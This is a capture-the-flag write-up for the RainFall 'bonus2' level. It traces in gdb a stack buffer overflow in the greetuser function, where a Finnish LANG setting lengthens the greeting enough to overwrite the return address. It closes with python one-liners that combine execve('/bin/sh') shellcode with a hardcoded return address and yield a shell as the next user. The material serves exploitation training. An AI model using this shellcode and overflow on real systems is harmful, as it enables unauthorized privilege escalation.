# Bonus2

before we start disass the main we check objdump and we found there is a global variable call **language**

```c
bonus2@RainFall:~$ objdump -t bonus2| grep .bss
08049980 l    d  .bss	00000000              .bss
08049980 l     O .bss	00000001              completed.6159
08049984 l     O .bss	00000004              dtor_idx.6161
08049980 g       *ABS*	00000000              __bss_start
08049988 g     O .bss	00000004              language
```

Lets disass the main function

we found in the begining this program chech if argc isnot equal to 3 leave and then fill size 0x13 in memory by 0

```c
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    ebx,[esp+0x50]
   0x0804854c <+35>:	mov    eax,0x0
   0x08048551 <+40>:	mov    edx,0x13
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
```

After that took 0x28 characters of argv[1] and copy it into `esp+0x50` the buffer that we just clear it, and complete the rest with 0x20 of argv[2]

```c
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:	add    eax,0x4
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:	lea    eax,[esp+0x50]
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:	add    eax,0x8
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:	lea    eax,[esp+0x50]
   0x08048594 <+107>:	add    eax,0x28
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
```

and then cal getenv of "LANG" and they check using memcmp the first two letters of return getenv if its equal of one of those address

`0x804873d:	 "fi"` or `0x8048740:	 "nl"` if it equal to the first one they set language = 1 if the second one language = 2

after this check they call a function `<greetuser>`

in this function they check first the value of language we have 3 cases

```c
   0x0804848a <+6>:	    mov    eax,ds:0x8049988 <= 'language'
   0x0804848f <+11>:	cmp    eax,0x1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    eax,0x2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   eax,eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
```

and then concat the value we insert with one of those depends on the language

```c
(gdb) x/s 0x8048710
0x8048710:	 "Hello "
(gdb) x/s 0x804872a
0x804872a:	 "Goedemiddag! "
(gdb) x/s 0x8048717
0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
(gdb) x/s 0x8048717
0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
```

we test to fill 0x28(40) + 0x20(32) = 72 to understand what happend in the memory we set breakpoint in <+152> greetuser we run the program with `'B' * 40 'A'*32`

```
(gdb) x/100wx $esp
0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
0xbffff5b0:	0x6c6c6548	0x4242206f	0x42424242	0x42424242
0xbffff5c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x41414242
0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x08004141
(gdb) x/x $ebp+0x4
0xbffff5fc:	0x08004141  we change the return address
```

so lets change the language and do the same test

```c
0xbffff5a0:	0xbffff5b0	0xbffff600	0x00000001	0x00000000
0xbffff5b0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
0xbffff5c0:	0x424220a4	0x42424242	0x42424242	0x42424242
0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff5e0:	0x42424242	0x42424242	0x41414242	0x41414141
0xbffff5f0:	0x41414141	0x41414141 |0x41414141|	0x41414141

the value selected is the return address
```

so in this case we just need to calculate the offset and add shellcode in the begining and change the return address

i used this website to calculate the offset  
 https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

```c
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
(gdb)
```

```c
bonus2@RainFall:~$ python -c "print 'B' * 18 + '\xc8\xf5\xff\xbf' + 'B' *30" > b
bonus2@RainFall:~$ python -c "print '\x90' * 6 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 30" > a
bonus2@RainFall:~$ ./bonus2 `cat a` `cat b`
Hyvää päivää ������j
                    X�Rh//shh/bin��1�̀AAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����BBBBBBBBBB
$ whoami
bonus3
$
```
